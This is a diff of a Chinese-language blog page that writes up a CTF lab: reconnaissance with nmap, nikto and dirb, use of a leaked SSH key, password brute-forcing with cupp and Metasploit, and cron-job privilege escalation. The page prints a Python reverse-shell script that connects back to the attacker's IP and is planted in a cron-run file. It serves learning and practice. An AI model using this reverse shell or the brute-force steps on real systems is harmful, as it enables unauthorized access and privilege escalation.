@@ -32,7 +32,7 @@
 <meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8715.png">
 <meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8716.png">
 <meta property="article:published_time" content="2020-05-23T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-05-24T13:36:45.977Z">
+<meta property="article:modified_time" content="2020-05-24T13:46:59.848Z">
 <meta property="article:author" content="WebDogC">
 <meta property="article:tag" content="复现、CTF、study、flag、ssh">
 <meta name="twitter:card" content="summary">
@@ -202,7 +202,7 @@
       
         <p><strong>0x00前言</strong><br>&emsp;&emsp;本篇文章为CTF学习记录系列SSH服务篇，本篇主要内容为通过cupp工具结合msf暴力破解用户密码提权到root权限。涉及知识点：cupp字典生成工具、msf暴力破解、ssh服务以及linux基础命令等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.107<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.102<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、cupp、msfconsole、VMware<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.3.102</code><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;&emsp;&emsp;开放端口： 22(ssh)、80(http)、111(PRC)<br>&emsp;&emsp;&emsp;&emsp;Web容器信息：Apache httpd 2.4.10<br>&emsp;&emsp;&emsp;&emsp;系统主机信息：Debian 5<br>&emsp;&emsp;针对开放http服务的80端口，进一步探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.102</code><br>&emsp;&emsp;输入<code>dirb http://192.168.3.102</code><br>&emsp;&emsp;扫描结果<br>&emsp;&emsp;/files/、/icons/、robots.txt、/wordpress-blog/、/manual/<br>&emsp;&emsp;<strong>深入挖掘</strong><br>&emsp;&emsp;打开浏览器访问靶场ip<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;可能是靶机用户名，查看页面源代码，无敏感信息<br>&emsp;&emsp;访问/files/，目录为空<br>&emsp;&emsp;访问/manual/，是apache首页<br>&emsp;&emsp;访问/wordpress-blog/，一张图片，页面源代码无信息<br>&emsp;&emsp;访问robots，无新信息<br>&emsp;&emsp;访问/icons/<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;发现一个不太正常的文件名，查看内容<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;ssh私钥信息<br>&emsp;&emsp;下载并重命名<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;进入到破解工具john的目录下<code>/usr/share/john</code>，将id_rsa文件放到此目录下<br>&emsp;&emsp;输入命令<code>python ssh2john.py id_rsa &gt;rsacrack</code>将id_rsa转换为john可识别的信息并保存为rsacrack文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;提示没有密码<br>&emsp;&emsp;直接尝试远程登录，登录之前需要赋予id_rsa可执行权限，先尝试martin用户<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;成功登录，无法知道密码，无法直接提权，这里可以利用cupp字典生成工具结合metasploit的暴力破解模块，对其密码进行暴力破解<br>&emsp;&emsp;进入到cupp目录<br>&emsp;&emsp;打开终端，输入<code>python3 cupp.py -i</code>以交互式问答的方式创建字典<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;创建好一个简单的字典后<br>&emsp;&emsp;打开msfconsole<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;执行之后，破解密码失败<br>&emsp;&emsp;———-分割线———<br>&emsp;&emsp;查看passwd文件查看其它用户<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;确认还存在jimmy、hadi用户<br>&emsp;&emsp;尝试定时任务提权，查看是否有非root权限的用户存在定时任务<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;看到jimmy用户存在一个定时任务，编辑sekurity.py的代码为python反弹shell代码，当其文件被执行时，就可以成功反弹终端<br>&emsp;&emsp;代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!&#x2F;usr&#x2F;bin&#x2F;python<br>import os,subprocess,socket<br><br>s&#x3D;socket.socket()<br>s.connect((&quot;攻击机ip&quot;,攻击机端口))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;])<br></code></pre></td></tr></table></figure>
-<p>&emsp;&emsp;创建文件、设置可执行权限，编辑文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;这是使用nano工具编辑文件，ctrl+o保存，回车确定，ctrl+x退出，成功编辑好之后<br>&emsp;&emsp;打开nc监听，定时任务为5分钟执行一次<br>&emsp;&emsp;发现ip设置错误，修改之后，继续等待<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;成功反弹终端后，同样不知道用户密码，同上，使用cupp生成字典，结合msf暴力破解密码，破解失败。<br>&emsp;&emsp;尝试最后一个用户hadi，操作同上<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;成功破解出hadi的密码为hadi123，打开会话<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8715.png" alt=""><br>&emsp;&emsp;利用python脚本反弹终端，输入密码提权<br>&emsp;&emsp;成功提权后，寻找Flag<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;成功获得Flag<br>&emsp;&emsp;<br><strong>0x04总结</strong><br>&emsp;&emsp;此次渗透，主要是通过ssh服务认识了cupp工具和熟悉了msf-ssh暴力破解ssh登录模块，同时还认识了通过定时任务反弹终端的新姿势。<br>&emsp;&emsp;难度尚可，继续学习。</p>
+<p>&emsp;&emsp;创建文件、设置可执行权限，编辑文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;这时使用nano工具编辑文件，ctrl+o保存，回车确定，ctrl+x退出，成功编辑好之后<br>&emsp;&emsp;打开nc监听，定时任务为5分钟执行一次<br>&emsp;&emsp;发现ip设置错误，修改之后，继续等待<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;成功反弹终端后，同样不知道用户密码，同上，使用cupp生成字典，结合msf暴力破解密码，破解失败。<br>&emsp;&emsp;尝试最后一个用户hadi，操作同上<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8714.png" alt=""><br>&emsp;&emsp;成功破解出hadi的密码为hadi123，打开会话<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8715.png" alt=""><br>&emsp;&emsp;利用python脚本反弹终端，输入密码提权<br>&emsp;&emsp;提权成功后，寻找Flag<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/SSH%E6%9C%8D%E5%8A%A1/%E5%9B%BE%E7%89%8716.png" alt=""><br>&emsp;&emsp;成功获得Flag<br>&emsp;&emsp;<br><strong>0x04总结</strong><br>&emsp;&emsp;此次渗透，主要是通过ssh服务认识了cupp工具和熟悉了msf-ssh暴力破解ssh登录模块，同时还认识了通过定时任务反弹终端的新姿势。<br>&emsp;&emsp;难度尚可，继续学习。</p>
 <p><br><br><br><br><font face="Georgia" color=#c4444>不断学习，不断积累。</font><br>作者：WebDogC</p>
 
       
@@ -307,6 +307,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2020/05/31/GetFlag-Mysql/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          GetFlag-MySQL
+        
+      </div>
+    </a>
   
   
     <a href="/2020/05/20/GetFlag-SSH%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2/" id="article-nav-older" class="article-nav-link-wrap">
@@ -521,6 +530,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">复现、CTF、study、flag、前置、环境</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">复现、CTF、study、flag、mysql</a>
               </li>
             
             <div class="clearfix"></div>
